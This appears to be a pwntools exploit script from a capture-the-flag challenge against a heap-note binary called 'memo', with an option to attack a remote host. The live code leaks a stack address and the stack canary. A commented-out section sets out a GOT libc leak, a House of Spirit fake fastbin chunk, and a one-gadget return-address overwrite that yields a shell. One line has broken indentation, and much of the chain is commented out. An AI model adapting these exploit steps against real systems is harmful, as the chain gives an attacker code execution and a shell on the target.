from pwn import *

GOT = 0x601fe0

def alloc(data):
	r.sendlineafter('> ', '1')

	if len(data) < 0x29:
		data += '\n'
	r.sendafter('Data: ', data)
        r.send("yes\x00")
	return

def edit(data):
	r.sendlineafter('> ', '2')

	if len(data) < 0x29:
		data += '\n'
	r.sendafter('Data: ', data)
	return

def libcLeak():
	r.sendlineafter('> ', '3')
	r.recvuntil('Data: ')
	return u64(r.recv(6).ljust(8, '\x00'))

def stackleak():
	r.sendlineafter('> ', '2')
	r.recvline()
	return u64(r.recv(6).ljust(8, '\x00'))

def canaryLeak():
	r.sendlineafter('> ', '3')
	r.recvline()
	return u64(r.recv(7).rjust(8, '\x00'))

def free():
	r.sendlineafter('> ', '4')
	return

def gup(data):

	r.sendlineafter('> ', '5')

	if len(data) < 0x30:
		data += '\n'
	r.sendafter('] ', data)

	return

def pwn():
	
	alloc('A'*0x1f)
	
	buf = stackleak() - 0x110
	log.success("Buffer: 0x{:x}".format(buf))
	
	alloc('A'*0x28)
	
	canary = canaryLeak()
	log.success("Canary: 0x{:x}".format(canary))
#	
#	gup('no\x00'.ljust(0x14, '\x00') + p64(GOT))
#	
#	libc     = libcLeak() - 0x36ea0
#	one_shot = libc + 0xf1117 
#	log.success("Libc:   0x{:x}".format(libc))
#	
#	fake_chunk  = p64(0x21)
#	fake_chunk += p32(0) 
#	fake_chunk += p64(buf + 0x10)
#	fake_chunk += p32(0) 
#	fake_chunk += p64(0)
#	fake_chunk += p64(0x1234)
#
#	gup('no\x00'.ljust(0x8, '\x00') + fake_chunk)
#	
#	'''	--==[[ House of Spirit ]]==-- '''
#
#	# Place stack buffer in the fastbin list 
#	free()

	'''
	(0x20)     fastbin[0]: 0x7fffffffe480 --> 0x0
	(0x30)     fastbin[1]: 0x0
	(0x40)     fastbin[2]: 0x0
	(0x50)     fastbin[3]: 0x0
	(0x60)     fastbin[4]: 0x0
	(0x70)     fastbin[5]: 0x0
	(0x80)     fastbin[6]: 0x0
                  top: 0x603070 (size : 0x20f90) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
	'''
	
	# we'll get back our stack buffer
#	alloc('kek\x00')
#	
#	# return address => one gadget
#	edit(p64(0)*3 + p64(canary) + p64(0) + p64(one_shot))
#	
#	# give up and pop a shell
#	gup('yes\x00')
#	
#	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./memo')
        #pause()
        pwn()

